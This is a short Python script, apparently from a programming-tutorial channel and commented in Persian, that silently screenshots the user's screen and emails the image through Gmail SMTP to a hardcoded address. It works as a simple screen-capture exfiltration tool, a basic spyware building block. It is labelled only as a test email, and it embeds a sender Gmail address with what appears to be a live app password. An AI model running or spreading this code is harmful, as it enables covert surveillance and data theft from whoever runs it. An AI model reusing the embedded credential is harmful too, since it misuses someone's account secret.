#discord: https://discord.gg/xbN3XSHYjx
#youtube: https://www.youtube.com/@IIIHaZaRd
#pytholearn
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import pyautogui

pic = pyautogui.screenshot()
pic.save("pic.jpg")

def send_email(sender_email, sender_password, receiver_email, subject, message,img_path):
    # تنظیمات اتصال به سرور SMTP گوگل
    smtp_server = "smtp.gmail.com"
    smtp_port = 587

    # ساختن پیام
    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg["Subject"] = subject

    # افزودن متن پیام
    msg.attach(MIMEText(message, "plain"))

    with open(img_path,"rb") as file:
        img_data = file.read()
    img = MIMEImage(img_data)
    img.add_header("test1","attachment",filename="pic.jpg")
    msg.attach(img)

    # برقراری ارتباط با سرور SMTP
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(sender_email, sender_password)

    # ارسال ایمیل
    server.send_message(msg)

    # خاتمه ارتباط با سرور SMTP
    server.quit()

# مقادیر ورودی
sender_email = "police123456789ilia@gmail.com"
sender_password = "qctkfkelxoucaweo"
receiver_email = "iliapolice123456789@gmail.com"
subject = "Hello from Python"
message = "This is a test email."
img_path = "pic.jpg"

# فراخوانی تابع ارسال ایمیل
send_email(sender_email, sender_password, receiver_email, subject, message,img_path)
#discord: https://discord.gg/xbN3XSHYjx
#youtube: https://www.youtube.com/@IIIHaZaRd
#pytholearn